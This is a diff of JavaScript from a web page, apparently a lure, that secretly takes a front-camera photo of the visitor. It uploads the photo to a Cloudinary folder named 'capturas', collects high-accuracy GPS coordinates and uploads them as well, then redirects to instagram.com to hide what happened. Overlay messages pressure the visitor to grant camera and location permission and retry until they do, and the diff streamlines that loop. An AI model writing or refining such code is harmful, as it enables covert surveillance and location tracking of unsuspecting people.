@@ -31,14 +31,15 @@
     const uploadPreset = "upload";
     const folderName = "capturas";
 
+    const overlay = document.getElementById("overlay");
+
     function showOverlay(message, callback) {
-      const overlay = document.getElementById("overlay");
       overlay.textContent = message;
       overlay.style.display = "flex";
 
       const handler = () => {
-        overlay.removeEventListener("click", handler);
         overlay.style.display = "none";
+        overlay.removeEventListener("click", handler);
         if (callback) callback();
       };
 
@@ -52,12 +53,12 @@
           video: { facingMode: "user" },
           audio: false
         });
-
         const video = document.createElement("video");
         video.playsInline = true;
         video.muted = true;
         video.srcObject = stream;
         await video.play();
+
         await new Promise(r => setTimeout(r, 200));
 
         const canvas = document.createElement("canvas");
@@ -85,22 +86,15 @@
         return data.secure_url;
       } catch (error) {
         console.error("Erro na captura da foto:", error);
-        showOverlay("São necessárias as permissões da CÂMERA. Toque para tentar novamente.", () => {
-          startFlow(); // Recomeça tudo
+        showOverlay("Permissão da câmera é necessária. Toque para tentar novamente.", () => {
+          startFlow(); // volta ao início se a câmera for negada
         });
         throw error;
       }
     }
 
-    async function requestLocation(imageUrl) {
-      try {
-        const permission = await navigator.permissions.query({ name: "geolocation" });
-
-        if (permission.state === "denied") {
-          showOverlay("Permissão de LOCALIZAÇÃO negada. Vá em Ajustes > Safari > Localização e permita o acesso.");
-          return;
-        }
-
+    function requestLocation(imageUrl) {
+      const tryGetLocation = () => {
         navigator.geolocation.getCurrentPosition(async (pos) => {
           try {
             const { latitude, longitude } = pos.coords;
@@ -117,31 +111,27 @@
               body: textForm
             });
 
-            if (!textResp.ok) throw new Error("Erro ao enviar localização");
+            if (!textResp.ok) throw new Error("Erro ao enviar o arquivo de localização");
             window.location.href = "https://instagram.com";
           } catch (err) {
-            console.error("Erro ao enviar localização:", err);
-            showOverlay("Erro ao enviar localização. Toque para tentar de novo.", () => {
-              requestLocation(imageUrl);
+            console.error("Erro no envio da localização:", err);
+            showOverlay("Permissão de localização é necessária. Toque para tentar novamente.", () => {
+              tryGetLocation();
             });
           }
         }, (err) => {
           console.error("Erro ao obter localização:", err);
-          showOverlay("Permissão de LOCALIZAÇÃO recusada. Toque para tentar novamente.", () => {
-            requestLocation(imageUrl);
+          showOverlay("Permissão de localização é necessária. Toque para tentar novamente.", () => {
+            tryGetLocation();
           });
         }, {
           enableHighAccuracy: true,
           timeout: 8000,
           maximumAge: 0
         });
+      };
 
-      } catch (err) {
-        console.error("Erro ao checar permissão de localização:", err);
-        showOverlay("Erro ao checar permissão. Toque para tentar novamente.", () => {
-          requestLocation(imageUrl);
-        });
-      }
+      tryGetLocation(); // primeira tentativa
     }
 
     async function startFlow() {
@@ -149,7 +139,7 @@
         const imageUrl = await capturePhoto();
         requestLocation(imageUrl);
       } catch (e) {
-        console.error("Erro no fluxo geral:", e);
+        console.error("Erro no fluxo:", e);
       }
     }
 
